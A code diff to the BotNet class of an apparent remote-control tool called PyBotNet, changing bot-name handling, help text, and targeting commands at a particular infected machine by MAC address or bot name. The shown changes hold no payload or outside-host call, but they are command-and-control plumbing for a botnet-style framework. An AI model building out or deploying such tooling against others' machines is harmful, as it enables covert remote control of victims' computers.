@@ -39,7 +39,8 @@ class BotNet:
         **extra,
     ):
         self.engine = engine
-        self.BOT_NAME = bot_name
+        self.BOT_NAME = str(bot_name).strip().replace(" ", "_")
+
         self.version = version
         self.delay = delay
         self.use_default_scripts = use_default_scripts
@@ -115,24 +116,30 @@ class BotNet:
 
     def _help(self, script_name=None) -> str:
         all_scripts_name = list(self.scripts.keys())
-        all_scripts_name.append("help")
-        all_scripts_name = ", ".join(all_scripts_name)
-        help_str = f"""All scripts name: \n\t{all_scripts_name} 
+        all_scripts_name.extend(["help", "start"])
+        all_scripts_name = "\n".join(all_scripts_name)
+        help_str = f"""All scripts name: \n\n{all_scripts_name} 
 
 Get more details about a script:
     `/help script-name`
 
-Run script:
-    `/command-name [params]`
+Run script Syntax:
+    `/[SCRIPT-NAME] [params]`
+    or
+    `[mac-address] /[SCRIPT-NAME] [params]`
+    or
+    `[BOT-NAME] /[SCRIPT-NAME] [params]`
 
     Example:
-        `/echo 10 message`
+        `/echo hi`
+        `94945035671481 /echo hi`
+        `bot_name /echo hi`
 
 PyBotNet version: {__version__}
 Docs: {__github_link__}
 """
         if script_name:
-            if script_name == "help":
+            if script_name in ["help", "start"]:
                 return help_str
 
             script = self.scripts.get(script_name)
@@ -140,7 +147,7 @@ Docs: {__github_link__}
                 extra = ""
                 for k, v in script.__extra__.items():
                     extra += f"\n{k}: {v}"
-                return f"""NAME:\n{script.__name__}\n\nDESCRIPTION:\n{script.__doc__}\n{extra}"""
+                return f"""SCRIPT-NAME:\n{script.__name__}\n\nDESCRIPTION:\n{script.__doc__}\n{extra}"""
             else:
                 return f"script `{script_name}` not found\n" + help_str
 
@@ -255,9 +262,9 @@ Docs: {__github_link__}
                 _logger.debug(f"Engine[{self.engine}] Error: {e}")
                 command = False
 
-            # check for mac_addres
+            # check for mac_addres or self.BOT_NAME
             if self._valid_command(command, expected_length=2):
-                if command[0] == str(uuid.getnode()):
+                if command[0] in [str(uuid.getnode()), self.BOT_NAME] :
                     command = command[1:]
 
             if not self._valid_command(command, check_slash=True):
@@ -267,7 +274,7 @@ Docs: {__github_link__}
 
             command[0] = command[0][1:]  # remove slash
 
-            if command[0] == "help":
+            if command[0] in ["help", "start"]:
                 _help_script_name = None
 
                 if len(command) > 1:
